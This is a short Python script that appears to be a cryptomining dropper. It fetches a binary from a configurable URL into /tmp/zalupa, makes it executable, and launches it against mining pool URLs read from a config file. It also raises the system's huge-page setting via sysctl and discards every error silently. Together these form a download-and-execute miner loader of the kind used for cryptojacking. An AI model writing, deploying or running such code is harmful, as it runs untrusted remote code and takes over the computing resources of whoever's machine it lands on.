import json
import os
import subprocess
import requests
import datetime
import pathlib
import sys

def load_config(path):
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return None

def create_directory(path):
    os.makedirs(path, exist_ok=True)

def download_binary(url, target_path):
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        with open(target_path, 'wb') as f:
            f.write(response.content)
        os.chmod(target_path, 0o755)
        return True
    except (requests.RequestException, OSError):
        return False

def execute_mining_command(pool_url, node_path):
    try:
        subprocess.run([node_path, '--pool', pool_url], check=True)
    except subprocess.CalledProcessError:
        pass

def monitor_resources(config):
    if config.get('monitor_cpu', False):
        print("CPU monitoring enabled")
        if config.get('huge_pages', False):
            try:
                subprocess.run(['sysctl', '-w', 'vm.nr_hugepages=2048'], check=True)
            except subprocess.CalledProcessError:
                pass

def main():
    config_path = os.environ.get('CONFIG_PATH', 'config.json')
    config = load_config(config_path)
    if config is None:
        return

    target_dir = '/tmp/zalupa'
    create_directory(target_dir)

    default_node_url = os.environ.get('NODE_URL', 'https://example.com/node_binary')
    node_url = config.get('node_url', default_node_url)
    node_path = os.path.join(target_dir, 'node_binary')

    if not download_binary(node_url, node_path):
        print("Failed to download node binary")
        return

    pools = config.get('pools', [])
    for pool in pools:
        pool_url = pool.get('url')
        if pool_url:
            execute_mining_command(pool_url, node_path)

    monitor_resources(config)

if __name__ == '__main__':
    main()
